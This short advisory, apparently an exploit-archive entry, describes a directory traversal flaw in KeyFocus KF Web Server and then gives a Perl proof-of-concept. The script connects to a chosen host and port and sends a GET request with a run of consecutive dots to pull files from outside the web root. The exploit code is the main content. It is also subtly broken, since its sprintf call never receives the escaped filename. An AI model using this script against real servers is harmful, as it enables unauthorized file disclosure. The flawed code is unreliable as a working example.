source: http://www.securityfocus.com/bid/6180/info

KeyFocus KF Web Server is vulnerable to a directory traversal attack. This is due to the web server's inability to properly handle file names containing consecutive dot characters. By exploiting this vulnerability, an attacker is able to break out of the web root and retrieve any file readable by the web server. Only files of recognized MIME types can be retrieved. 

#!/usr/bin/perl
use URI::Escape;
use IO::Socket;
if (@ARGV < 2) {
print STDOUT "Usage: perl $0 [filename] [host] [port]";
} else {
$f =
IO::Socket::INET->new(PeerAddr=>$ARGV[1],PeerPort=>$ARGV[2],Proto=>"tcp");
$url = uri_escape($ARGV[0]);
$exploit = sprintf("GET /.............../%s HTTP/1.0\r\n\r\n");
print $f $exploit;
undef $f;
}